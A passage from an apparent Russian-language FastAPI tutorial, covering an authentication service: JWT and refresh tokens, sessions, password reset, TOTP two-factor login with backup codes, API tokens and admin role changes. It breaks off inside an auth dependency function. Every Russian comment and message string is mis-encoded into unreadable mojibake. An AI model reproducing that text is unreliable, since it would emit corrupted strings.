            user.record_failed_login(ip_address)
            await self.db.commit()
            
            # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
            logger.warning(
                f"Failed login attempt for user: {user.id} from {ip_address}",
                extra={
                    "user_id": user.id,
                    "ip_address": ip_address,
                    "failed_attempts": user.failed_login_attempts
                }
            )
        else:
            # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            logger.warning(
                f"Failed login attempt for non-existent user from {ip_address}",
                extra={"ip_address": ip_address}
            )
    
    async def _create_tokens(self, user: User, remember_me: bool) -> Dict[str, Any]:
        """–°–æ–∑–¥–∞–Ω–∏–µ JWT —Ç–æ–∫–µ–Ω–æ–≤"""
        # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ claims
        additional_claims = {
            "role": user.role,
            "email": user.email,
            "username": user.username
        }
        
        # Access token (–∫–æ—Ä–æ—Ç–∫–æ–∂–∏–≤—É—â–∏–π)
        access_token_expires = timedelta(minutes=15)
        access_token = create_access_token(
            subject=user.id,
            expires_delta=access_token_expires,
            additional_claims=additional_claims
        )
        
        # Refresh token (–¥–æ–ª–≥–æ–∂–∏–≤—É—â–∏–π)
        if remember_me:
            refresh_token_expires = timedelta(days=30)
        else:
            refresh_token_expires = timedelta(days=7)
        
        refresh_token = create_refresh_token(
            subject=user.id,
            expires_delta=refresh_token_expires
        )
        
        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "bearer",
            "expires_in": int(access_token_expires.total_seconds())
        }
    
    async def _create_session(
        self, 
        user: User, 
        refresh_token: str,
        user_agent: str,
        ip_address: str
    ):
        """–°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        # –†–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ–º refresh token —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å expiry
        token_data = verify_token(refresh_token)
        if not token_data:
            raise UnauthorizedException(detail="Invalid refresh token")
        
        # –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: JWT exp —Ö—Ä–∞–Ω–∏—Ç—Å—è –∫–∞–∫ Unix timestamp
        # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ timezone-aware datetime
        expires_at = datetime.fromtimestamp(token_data["exp"], tz=timezone.utc)
        
        session = UserSession(
            user_id=user.id,
            session_token=refresh_token,
            user_agent=user_agent,
            ip_address=ip_address,
            expires_at=expires_at
        )
        
        self.db.add(session)
    
    async def _create_2fa_token(
        self, 
        user: User,
        user_agent: str,
        ip_address: str
    ) -> Tuple[User, Token]:
        """–°–æ–∑–¥–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞ –¥–ª—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
        # –°–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω —Ç–æ–ª—å–∫–æ –¥–ª—è 2FA
        two_factor_token = create_access_token(
            subject=user.id,
            expires_delta=timedelta(minutes=5),
            additional_claims={"purpose": "2fa"}
        )
        
        token = Token(
            access_token=two_factor_token,
            refresh_token="",
            token_type="bearer",
            expires_in=300
        )
        
        logger.info(f"2FA token created for user: {user.id}")
        
        return user, token
    
    # ===== –û–ë–ù–û–í–õ–ï–ù–ò–ï –¢–û–ö–ï–ù–û–í =====
    
    async def refresh_token(self, refresh_token: str) -> Token:
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ access —Ç–æ–∫–µ–Ω–∞ —Å –ø–æ–º–æ—â—å—é refresh —Ç–æ–∫–µ–Ω–∞"""
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ refresh —Ç–æ–∫–µ–Ω–∞
        token_data = verify_token(refresh_token)
        if not token_data or token_data.get("type") != "refresh":
            raise UnauthorizedException(detail="Invalid refresh token")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Å—Å–∏–∏
        session_query = select(UserSession).where(
            and_(
                UserSession.session_token == refresh_token,
                UserSession.is_active == True
            )
        )
        
        session_result = await self.db.execute(session_query)
        session = session_result.scalar_one_or_none()
        
        if not session or session.is_expired():
            raise UnauthorizedException(detail="Session expired")
        
        # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user_query = select(User).where(User.id == session.user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user or not user.is_active():
            raise UnauthorizedException(detail="User not found or inactive")
        
        # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏
        session.last_activity = datetime.now(timezone.utc)
        
        # –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ access —Ç–æ–∫–µ–Ω–∞
        additional_claims = {
            "role": user.role,
            "email": user.email,
            "username": user.username
        }
        
        access_token_expires = timedelta(minutes=15)
        access_token = create_access_token(
            subject=user.id,
            expires_delta=access_token_expires,
            additional_claims=additional_claims
        )
        
        new_tokens = Token(
            access_token=access_token,
            refresh_token=refresh_token,  # –¢–æ—Ç –∂–µ refresh —Ç–æ–∫–µ–Ω
            token_type="bearer",
            expires_in=int(access_token_expires.total_seconds())
        )
        
        await self.db.commit()
        
        logger.info(f"Token refreshed for user: {user.id}")
        
        return new_tokens
    
    # ===== –í–´–•–û–î =====
    
    async def logout(self, refresh_token: str) -> bool:
        """–í—ã—Ö–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (—É–¥–∞–ª–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏)"""
        # –ù–∞—Ö–æ–¥–∏–º –∏ –¥–µ–∞–∫—Ç–∏–≤–∏—Ä—É–µ–º —Å–µ—Å—Å–∏—é
        session_query = select(UserSession).where(
            UserSession.session_token == refresh_token
        )
        
        session_result = await self.db.execute(session_query)
        session = session_result.scalar_one_or_none()
        
        if session:
            session.is_active = False
            await self.db.commit()
            
            logger.info(f"User logged out: session {session.id}")
            return True
        
        return False
    
    async def logout_all_sessions(self, user_id: int) -> bool:
        """–í—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤"""
        update_query = update(UserSession).where(
            and_(
                UserSession.user_id == user_id,
                UserSession.is_active == True
            )
        ).values(is_active=False)
        
        result = await self.db.execute(update_query)
        await self.db.commit()
        
        logger.info(f"All sessions terminated for user: {user_id}")
        return result.rowcount > 0
    
    # ===== –°–ë–†–û–° –ü–ê–†–û–õ–Ø =====
    
    async def request_password_reset(self, email: str) -> bool:
        """–ó–∞–ø—Ä–æ—Å –Ω–∞ —Å–±—Ä–æ—Å –ø–∞—Ä–æ–ª—è"""
        user_query = select(User).where(User.email == email)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user or not user.is_active():
            # –í–æ–∑–≤—Ä–∞—â–∞–µ–º true –¥–∞–∂–µ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω
            # –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –ø–µ—Ä–µ–±–æ—Ä–∞ email
            return True
        
        # –°–æ–∑–¥–∞–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞ —Å–±—Ä–æ—Å–∞ –ø–∞—Ä–æ–ª—è
        reset_token = create_password_reset_token(email)
        user.password_reset_token = reset_token
        user.password_reset_sent_at = datetime.now(timezone.utc)
        
        await self.db.commit()
        
        # –û—Ç–ø—Ä–∞–≤–∫–∞ email —Å —Å—Å—ã–ª–∫–æ–π –¥–ª—è —Å–±—Ä–æ—Å–∞
        # –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: –í production –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ email
        # reset_link = f"{settings.FRONTEND_URL}/reset-password?token={reset_token}"
        # await send_password_reset_email(user.email, reset_link)
        logger.info(f"Password reset requested for user: {user.id}")
        
        return True
    
    async def reset_password(self, reset_data: PasswordResetConfirm) -> bool:
        """–°–±—Ä–æ—Å –ø–∞—Ä–æ–ª—è —Å –ø–æ–º–æ—â—å—é —Ç–æ–∫–µ–Ω–∞"""
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞
        email = verify_password_reset_token(reset_data.token)
        if not email:
            raise ValidationException(detail="Invalid or expired reset token")
        
        # –ü–æ–∏—Å–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user_query = select(User).where(
            and_(
                User.email == email,
                User.password_reset_token == reset_data.token,
                User.status == UserStatus.ACTIVE
            )
        )
        
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user:
            raise ValidationException(detail="Invalid or expired reset token")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ä–µ–º–µ–Ω–∏ (—Ç–æ–∫–µ–Ω –¥–µ–π—Å—Ç–≤—É–µ—Ç 1 —á–∞—Å)
        if user.password_reset_sent_at:
            time_diff = datetime.now(timezone.utc) - user.password_reset_sent_at
            if time_diff.total_seconds() > 3600:  # 1 —á–∞—Å
                raise ValidationException(detail="Reset token expired")
        
        # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è
        hashed_password = get_password_hash(reset_data.new_password)
        user.hashed_password = hashed_password
        user.password_reset_token = None
        user.password_reset_sent_at = None
        user.last_password_change = datetime.now(timezone.utc)
        
        # –°–±—Ä–æ—Å –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π (–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å)
        await self.logout_all_sessions(user.id)
        
        await self.db.commit()
        
        logger.info(f"Password reset successful for user: {user.id}")
        
        # –û—Ç–ø—Ä–∞–≤–∫–∞ email —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–± —É—Å–ø–µ—à–Ω–æ–º —Å–±—Ä–æ—Å–µ –ø–∞—Ä–æ–ª—è
        # –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: –í production –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        # await send_password_changed_notification(user.email)
        
        return True
    
    # ===== –ò–ó–ú–ï–ù–ï–ù–ò–ï –ü–ê–†–û–õ–Ø =====
    
    async def change_password(
        self, 
        user_id: int, 
        password_data: ChangePassword
    ) -> bool:
        """–ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è (–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º)"""
        user_query = select(User).where(User.id == user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user:
            raise NotFoundException(resource_name="user", resource_id=user_id)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–µ–∫—É—â–µ–≥–æ –ø–∞—Ä–æ–ª—è
        if not verify_password(password_data.current_password, user.hashed_password):
            raise ValidationException(
                detail="–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–µ–∫—É—â–∏–π –ø–∞—Ä–æ–ª—å",
                errors={"current_password": "incorrect"}
            )
        
        # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è
        hashed_password = get_password_hash(password_data.new_password)
        user.hashed_password = hashed_password
        user.last_password_change = datetime.now(timezone.utc)
        
        # –í—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∫—Ä–æ–º–µ —Ç–µ–∫—É—â–µ–≥–æ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
        # await self.logout_all_sessions(user.id)
        
        await self.db.commit()
        
        logger.info(f"Password changed for user: {user.id}")
        
        return True
    
    # ===== –î–í–£–•–§–ê–ö–¢–û–†–ù–ê–Ø –ê–£–¢–ï–ù–¢–ò–§–ò–ö–ê–¶–ò–Ø =====
    
    async def setup_two_factor(self, user_id: int, password: str) -> Dict[str, Any]:
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
        user_query = select(User).where(User.id == user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user:
            raise NotFoundException(resource_name="user", resource_id=user_id)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è
        if not verify_password(password, user.hashed_password):
            raise ValidationException(detail="–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å")
        
        # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–µ–∫—Ä–µ—Ç–∞
        secret = pyotp.random_base32()
        
        # –°–æ–∑–¥–∞–Ω–∏–µ URI –¥–ª—è QR –∫–æ–¥–∞
        totp = pyotp.TOTP(secret)
        uri = totp.provisioning_uri(
            name=user.email,
            issuer_name="Library API"
        )
        
        # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–¥–æ–≤
        backup_codes = [secrets.token_hex(4) for _ in range(10)]
        
        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ –±–∞–∑–µ (–Ω–æ –ø–æ–∫–∞ –Ω–µ –≤–∫–ª—é—á–∞–µ–º 2FA)
        user.two_factor_secret = secret
        user.two_factor_backup_codes = json.dumps(backup_codes)
        
        await self.db.commit()
        
        # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR –∫–æ–¥–∞
        qr = qrcode.QRCode()
        qr.add_data(uri)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        # –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –≤ base64
        buffered = io.BytesIO()
        img.save(buffered, format="PNG")
        qr_code_base64 = base64.b64encode(buffered.getvalue()).decode()
        
        return {
            "secret": secret,
            "qr_code": f"data:image/png;base64,{qr_code_base64}",
            "backup_codes": backup_codes,
            "message": "–°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR –∫–æ–¥ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞"
        }
    
    async def verify_two_factor_setup(
        self, 
        user_id: int, 
        code: str
    ) -> bool:
        """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
        user_query = select(User).where(User.id == user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user or not user.two_factor_secret:
            raise ValidationException(detail="2FA –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞
        totp = pyotp.TOTP(user.two_factor_secret)
        if not totp.verify(code):
            raise ValidationException(detail="–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥")
        
        # –ê–∫—Ç–∏–≤–∞—Ü–∏—è 2FA
        user.two_factor_enabled = True
        
        await self.db.commit()
        
        logger.info(f"2FA enabled for user: {user.id}")
        
        return True
    
    async def verify_two_factor_login(
        self, 
        two_factor_token: str,
        code: str,
        user_agent: str,
        ip_address: str
    ) -> Tuple[User, Token]:
        """–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø—Ä–∏ –≤—Ö–æ–¥–µ"""
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ 2FA —Ç–æ–∫–µ–Ω–∞
        token_data = verify_token(two_factor_token)
        if not token_data or token_data.get("purpose") != "2fa":
            raise UnauthorizedException(detail="Invalid 2FA token")
        
        user_id = token_data.get("sub")
        if not user_id:
            raise UnauthorizedException(detail="Invalid token data")
        
        # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user_query = select(User).where(User.id == int(user_id))
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user or not user.two_factor_enabled:
            raise UnauthorizedException(detail="2FA –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞")
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞ –∏–ª–∏ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–¥–∞
        is_valid = False
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ TOTP –∫–æ–¥–∞
        if user.two_factor_secret:
            totp = pyotp.TOTP(user.two_factor_secret)
            if totp.verify(code):
                is_valid = True
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–¥–∞
        if not is_valid and user.two_factor_backup_codes:
            backup_codes = json.loads(user.two_factor_backup_codes)
            if code in backup_codes:
                # –£–¥–∞–ª–µ–Ω–∏–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω–æ–≥–æ —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –∫–æ–¥–∞
                backup_codes.remove(code)
                user.two_factor_backup_codes = json.dumps(backup_codes)
                is_valid = True
        
        if not is_valid:
            raise ValidationException(detail="–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥")
        
        # –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤
        tokens = await self._create_tokens(user, remember_me=False)
        
        # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        user.record_successful_login(ip_address)
        
        # –°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏
        await self._create_session(user, tokens["refresh_token"], user_agent, ip_address)
        
        await self.db.commit()
        
        logger.info(f"2FA login successful for user: {user.id}")
        
        return user, tokens
    
    async def disable_two_factor(
        self, 
        user_id: int, 
        password: str
    ) -> bool:
        """–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
        user_query = select(User).where(User.id == user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user:
            raise NotFoundException(resource_name="user", resource_id=user_id)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è
        if not verify_password(password, user.hashed_password):
            raise ValidationException(detail="–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å")
        
        # –û—Ç–∫–ª—é—á–µ–Ω–∏–µ 2FA
        user.two_factor_enabled = False
        user.two_factor_secret = None
        user.two_factor_backup_codes = None
        
        await self.db.commit()
        
        logger.info(f"2FA disabled for user: {user.id}")
        
        return True
    
    # ===== API –¢–û–ö–ï–ù–´ =====
    
    async def create_api_token(
        self, 
        user_id: int, 
        token_data: APITokenCreate
    ) -> APIToken:
        """–°–æ–∑–¥–∞–Ω–∏–µ API —Ç–æ–∫–µ–Ω–∞"""
        user_query = select(User).where(User.id == user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user:
            raise NotFoundException(resource_name="user", resource_id=user_id)
        
        # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ç–æ–∫–µ–Ω–∞
        token = generate_api_key()
        
        # –†–∞—Å—á–µ—Ç –¥–∞—Ç—ã –∏—Å—Ç–µ—á–µ–Ω–∏—è
        expires_at = None
        if token_data.expires_in_days:
            expires_at = datetime.now(timezone.utc) + timedelta(days=token_data.expires_in_days)
        
        # –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–ø–∏—Å–∏
        api_token = APIToken(
            user_id=user_id,
            name=token_data.name,
            token=token,
            scopes=json.dumps(token_data.scopes),
            expires_at=expires_at
        )
        
        self.db.add(api_token)
        await self.db.commit()
        await self.db.refresh(api_token)
        
        logger.info(f"API token created for user: {user_id}, token: {api_token.id}")
        
        return api_token
    
    async def get_user_api_tokens(self, user_id: int) -> list[APIToken]:
        """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ API —Ç–æ–∫–µ–Ω–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        query = select(APIToken).where(
            and_(
                APIToken.user_id == user_id,
                APIToken.is_active == True
            )
        ).order_by(APIToken.created_at.desc())
        
        result = await self.db.execute(query)
        return result.scalars().all()
    
    async def revoke_api_token(self, user_id: int, token_id: int) -> bool:
        """–û—Ç–∑—ã–≤ API —Ç–æ–∫–µ–Ω–∞"""
        query = select(APIToken).where(
            and_(
                APIToken.id == token_id,
                APIToken.user_id == user_id
            )
        )
        
        result = await self.db.execute(query)
        token = result.scalar_one_or_none()
        
        if not token:
            raise NotFoundException(resource_name="API token", resource_id=token_id)
        
        token.is_active = False
        await self.db.commit()
        
        logger.info(f"API token revoked: {token_id}")
        
        return True
    
    # ===== –£–ü–†–ê–í–õ–ï–ù–ò–ï –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø–ú–ò (–ê–î–ú–ò–ù) =====
    
    async def get_user_by_id(self, user_id: int) -> Optional[User]:
        """–ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ ID"""
        query = select(User).where(User.id == user_id)
        result = await self.db.execute(query)
        return result.scalar_one_or_none()
    
    async def update_user_role(
        self, 
        user_id: int, 
        new_role: UserRole,
        current_user_id: int
    ) -> User:
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ä–æ–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤)"""
        # –ù–µ–ª—å–∑—è –∏–∑–º–µ–Ω–∏—Ç—å —Å–≤–æ—é —Ä–æ–ª—å
        if user_id == current_user_id:
            raise ValidationException(detail="–ù–µ–ª—å–∑—è –∏–∑–º–µ–Ω–∏—Ç—å —Å–≤–æ—é —Ä–æ–ª—å")
        
        user_query = select(User).where(User.id == user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user:
            raise NotFoundException(resource_name="user", resource_id=user_id)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞, —á—Ç–æ –Ω–æ–≤–∞—è —Ä–æ–ª—å –≤–∞–ª–∏–¥–Ω–∞
        if new_role not in UserRole:
            raise ValidationException(detail="–ù–µ–≤–µ—Ä–Ω–∞—è —Ä–æ–ª—å")
        
        user.role = new_role
        await self.db.commit()
        
        logger.info(f"User role updated: {user.id} -> {new_role}")
        
        return user
    
    async def update_user_status(
        self, 
        user_id: int, 
        new_status: UserStatus,
        reason: Optional[str] = None
    ) -> User:
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
        user_query = select(User).where(User.id == user_id)
        user_result = await self.db.execute(user_query)
        user = user_result.scalar_one_or_none()
        
        if not user:
            raise NotFoundException(resource_name="user", resource_id=user_id)
        
        user.status = new_status
        
        if new_status == UserStatus.SUSPENDED or new_status == UserStatus.BANNED:
            # –í—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —Å–µ—Å—Å–∏–π
            await self.logout_all_sessions(user_id)
        
        await self.db.commit()
        
        logger.info(
            f"User status updated: {user.id} -> {new_status}",
            extra={"reason": reason}
        )
        
        return user
```

### **6. –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏**

**–ó–∞—á–µ–º –Ω—É–∂–Ω—ã –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ FastAPI:**
- –ü–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ª–æ–≥–∏–∫–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
- –õ–µ–≥–∫–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ
- –ß–∏—Å—Ç—ã–π –∫–æ–¥ –≤ endpoints

**–ü—Ä–∏–Ω—Ü–∏–ø—ã:**
- –°–æ–∑–¥–∞–≤–∞–π—Ç–µ –∫–æ–º–ø–æ–∑–∏—Ü–∏—é –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π (get_current_user ‚Üí get_current_active_user)
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–∞–±—Ä–∏–∫–∏ –¥–ª—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
- –í–æ–∑–≤—Ä–∞—â–∞–π—Ç–µ –ø–æ–Ω—è—Ç–Ω—ã–µ –æ—à–∏–±–∫–∏
- –õ–æ–≥–∏—Ä—É–π—Ç–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å

```python
# app/dependencies/auth.py
import logging
from typing import Optional, List
from datetime import datetime, timezone
import json
from fastapi import Depends, HTTPException, status, Request
from fastapi.security import (
    HTTPBearer, 
    HTTPAuthorizationCredentials, 
    OAuth2PasswordBearer
)
from sqlalchemy.ext.asyncio import AsyncSession
from jose import JWTError, jwt

from app.core.config import settings
from app.core.security import verify_token
from app.core.exceptions import (
    UnauthorizedException, 
    ForbiddenException,
    ValidationException
)
from app.dependencies.database import get_db
from app.services.auth_service import AuthService
from app.models.user import UserRole

logger = logging.getLogger(__name__)

# OAuth2 –¥–ª—è –ø–∞—Ä–æ–ª—è
oauth2_scheme = OAuth2PasswordBearer(
    tokenUrl=f"{settings.API_V1_STR}/auth/login",
    auto_error=False
)

# HTTP Bearer –¥–ª—è API —Ç–æ–∫–µ–Ω–æ–≤
http_bearer = HTTPBearer(auto_error=False)

async def get_current_user(
    db: AsyncSession = Depends(get_db),
    oauth_token: Optional[str] = Depends(oauth2_scheme),
    bearer_token: Optional[HTTPAuthorizationCredentials] = Depends(http_bearer)
) -> dict:
    """
    –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ JWT —Ç–æ–∫–µ–Ω–∞ –∏–ª–∏ API —Ç–æ–∫–µ–Ω–∞
    
    –ü—Ä–∏–æ—Ä–∏—Ç–µ—Ç:
    1. OAuth2 —Ç–æ–∫–µ–Ω (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è)
    2. Bearer —Ç–æ–∫–µ–Ω (API —Ç–æ–∫–µ–Ω)
    """
    user_data = None
    
    # –ü–æ–ø—ã—Ç–∫–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ OAuth2 —Ç–æ–∫–µ–Ω
    if oauth_token:
        user_data = await _get_user_from_oauth_token(oauth_token, db)
    
    # –ü–æ–ø—ã—Ç–∫–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ API —Ç–æ–∫–µ–Ω
    elif bearer_token:
        user_data = await _get_user_from_api_token(bearer_token.credentials, db)
    
    if not user_data:
